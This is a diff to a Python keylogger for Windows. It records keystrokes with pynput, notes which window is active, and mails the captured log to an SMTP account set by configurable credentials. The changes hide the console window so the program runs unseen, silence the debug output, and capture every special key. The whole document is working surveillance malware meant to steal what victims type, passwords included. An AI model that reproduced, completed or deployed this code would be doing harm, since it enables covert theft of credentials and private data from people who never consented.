@@ -1,4 +1,5 @@
 import win32gui as wg
+import win32console as wc
 import pynput.keyboard
 import threading as thread5
 import sendmail
@@ -17,7 +18,7 @@ def checklog(gserver , gport , guser , gpass , mailfrom,  mailto ):
         firstreport = 1
     timereport = time.ctime()
     while True:
-        print(logdata)
+        #print(logdata)
         if len(logdata) > 30 :
             msg = logdata
             logdata = ''
@@ -30,10 +31,7 @@ def onpressevent(key):
     try :
         logdata = logdata + key.char
     except AttributeError :
-        if key in ['Key.ctrl_l' ,'Key.alt_l' , 'Key.ctrl_2' ,'Key.alt_2' ]:
-            if currentkey != key:
-                currentkey = key
-                logdata = logdata + key
+        logdata = logdata + " " + str(key) + " "
 
 def Checkifwindowchanged():
     global logdata
@@ -50,13 +48,24 @@ def startkeylogger():
     with kbdlisten :
         kbdlisten.join()
 
+def runobjects(gserver , gport , guser , gpass , mailfrom,  mailto):
+	wg.ShowWindow(wc.GetConsoleWindow(),0);
+	wtthread = thread5.Thread(target=Checkifwindowchanged)
+	kthread = thread5.Thread(target=startkeylogger)
+	mailthread = thread5.Thread(target=checklog , args=(gserver , gport , guser , gpass , mailfrom,  mailto))
+	kthread.start()
+	wtthread.start()
+	mailthread.start()
+	kthread.join()
+	wtthread.join()
+	mailthread.join()
+
 interval = 2
-wtthread = thread5.Thread(target=Checkifwindowchanged)
-kthread = thread5.Thread(target=startkeylogger)
-mailthread = thread5.Thread(target=checklog , args=(gserver , gport , guser , gpass , mailfrom,  mailto))
-kthread.start()
-wtthread.start()
-mailthread.start()
-kthread.join()
-wtthread.join()
-mailthread.join()
+gserver = ''
+gport = ''
+guser = ''
+gpass = ''
+mailfrom = ''
+mailto = ''
+subject = 'report '
+runobjects(gserver , gport , guser , gpass , mailfrom,  mailto)
